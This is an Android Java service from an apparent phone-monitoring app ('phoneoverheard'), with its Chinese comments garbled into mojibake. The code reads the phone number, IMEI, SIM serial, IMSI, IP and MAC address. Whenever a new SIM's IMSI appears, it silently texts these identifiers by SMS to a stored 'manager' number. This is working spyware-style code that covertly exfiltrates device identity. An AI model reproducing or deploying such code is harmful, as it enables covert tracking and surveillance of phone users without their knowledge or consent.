package com.phoneoverheard.phonne;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;

import com.phoneoverheard.database.ManagerService;
import com.phoneoverheard.database.Simmsg;
import com.phoneoverheard.database.SimmsgService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class haomaService extends Service {
	private static final String TAG = "haomaService";
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		super.onCreate();
		Log.i(TAG, "onCreate called.");
	}

	@Override
	public void onDestroy() {
		Log.i(TAG, "onDestroy called.");
		super.stopSelf();
		super.onDestroy();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i(TAG, "onStartCommand called.");
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	@SuppressLint("UnlocalizedSms")
	public void onStart(Intent intent, int startId) {
		Log.i(TAG, "onStart called.");
		mylog.WrLog("i", TAG, "onStart called.");
		String hostip = getLocalIpAddress(); // ��ȡ����IP(�ͻ���)
		String hostmac = getLocalMacAddress(); // ��ȡ����MAC(�ͻ���)
		Log.i(TAG, "hostip==" + hostip);
		Log.i(TAG, "hostmac==" + hostmac);
		mylog.WrLog("i", TAG, "hostip==" + hostip + " , hostmac==" + hostmac);
		ManagerService managerservice = new ManagerService(getBaseContext());
		managerservice.updateHostAdress("manager", hostip, hostmac);
		getPhoneNumber(getBaseContext());
		onDestroy();
	}

	/**
	 * 1.getPhoneNumber�������ص�ǰ�ֻ��ĵ绰���룬 ͬʱ������androidmanifest.xml��
	 * IMEI�����ƶ��豸ʶ���루IMEI��International Mobile Equipment Identification
	 * Number���������ƶ��豸�ı�־���������ƶ��豸�У������ڼ�ر��Ի���Ч���ƶ��豸��
	 * IMEI�������ͼ��ʾ���ƶ��ն��豸ͨ�����롰*#06#�����ɲ��
	 * �����ܳ�Ϊ15λ��ÿλ���ֽ�ʹ��0��9�����֡�����TAC�����ͺ�װ���룬��ŷ���ͺű�׼���ķ���
	 * ��FAC����װ�䳧�Һ��룻SNRΪ��Ʒ��ţ���������ͬһ��TAC��FAC�е�ÿ̨�ƶ��豸��SP�Ǳ��ñ���
	 * IMSI�����ƶ��û�ʶ���루IMSI��International Mobile Subscriber Identification
	 * Number���������ƶ��û��ı�־��������SIM���У������������ƶ��û�����Ч��Ϣ
	 * IMSI�������ͼ��ʾ�����ܳ��Ȳ�����15λ��ͬ��ʹ��0��9�����֡�
	 * ����MCC���ƶ��û��������Ҵ��ţ�ռ3λ���֣��й���MCC�涨Ϊ460��MNC���ƶ�������
	 * ���������λ������ɣ�����ʶ���ƶ��û����������ƶ�ͨ������MSIN���ƶ��û�ʶ���룬����ʶ��ĳһ�ƶ�ͨ�����е��ƶ��û��� ����
	 * android.permission.READ_PHONE_STATE ���Ȩ�ޣ�
	 * 2.�����Ļ�ȡ�û��ֻ�����һ������û��������Ͷ��ŵ�SP������ֻ�����ȡ��
	 * 
	 * @param context
	 */
	public void getPhoneNumber(Context context) {
		String simInfo = "";
		TelephonyManager mTelephonyMgr;
		mTelephonyMgr = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String deviceid = mTelephonyMgr.getDeviceId(); // ���ص�IMEI / MEID���豸
		String tel = mTelephonyMgr.getLine1Number(); // �����豸�ĵ绰���루MSISDN���룩
		String imei = mTelephonyMgr.getSimSerialNumber(); // IMEI
															// �����ƶ��豸ʶ����,SIM�������к�
		String imsi = mTelephonyMgr.getSubscriberId(); // IMSI �����ƶ��û�ʶ����
														// ,SIM��Ψһ��ʶ
		int SimState = mTelephonyMgr.getSimState(); // SIM��״̬
		simInfo = "tel:" + tel + ",imei:" + imei + ",imsi:" + imsi
				+ ",deviceid:" + deviceid + ",SimState:" + SimState;
		Log.i(TAG, "SIM����Ϣ��" + simInfo);
		mylog.WrLog("i", TAG, "SIM����Ϣ��" + simInfo);
		ManagerService managerservice = new ManagerService(getBaseContext());
		SimmsgService simmsgservice = new SimmsgService(getBaseContext());
		if (simmsgservice.dataExist(imsi)) {

			if (null == tel || tel.isEmpty()) {

			} else {
				Simmsg simmsg = new Simmsg(tel, deviceid, imei, imsi, SimState);
				simmsgservice.update(simmsg);
			}
		} else {
			String telnumber = managerservice.find("manager").getTelnumber();
			Simmsg simmsg = new Simmsg(telnumber, deviceid, imei, imsi,
					SimState);
			simmsgservice.insert(simmsg);
			// �ƶ���Ӫ������ÿ�η��͵��ֽ��������ޣ����ǿ���ʹ��Android�������ṩ �Ķ��Ź��ߡ�
			SmsManager sms = SmsManager.getDefault();
			// �������û�г������Ƴ��ȣ��򷵻�һ�����ȵ�List��
			List<String> texts = sms.divideMessage(simInfo);
			for (String text : texts) {
				sms.sendTextMessage(telnumber, null, text, null, null);
			}
		}
	}

	// ��ȡ����IP��ַ
	public String getLocalIpAddress() {
		try {
			for (Enumeration<NetworkInterface> en = NetworkInterface
					.getNetworkInterfaces(); en.hasMoreElements();) {
				NetworkInterface intf = en.nextElement();
				for (Enumeration<InetAddress> enumIpAddr = intf
						.getInetAddresses(); enumIpAddr.hasMoreElements();) {
					InetAddress inetAddress = enumIpAddr.nextElement();
					if (!inetAddress.isLoopbackAddress()) {
						return inetAddress.getHostAddress().toString();
					}
				}
			}
		} catch (SocketException ex) {
			Log.e(TAG, "WifiPreference IpAddress\n" + ex.toString());
			mylog.WrLog("e", TAG, "WifiPreference IpAddress\n" + ex.toString());
		}
		return null;
	}

	// ��ȡ����MAC��ַ
	public String getLocalMacAddress() {
		String LocalMacAddress = "";
		try {
			WifiManager wifi = (WifiManager) getSystemService(Context.WIFI_SERVICE);
			WifiInfo info = wifi.getConnectionInfo();
			LocalMacAddress = info.getMacAddress();
		} catch (Exception ex) {
			Log.e(TAG, "WifiPreference IpAddress\n" + ex.toString());
			mylog.WrLog("e", TAG, "WifiPreference IpAddress\n" + ex.toString());
		}
		return LocalMacAddress;
	}

}
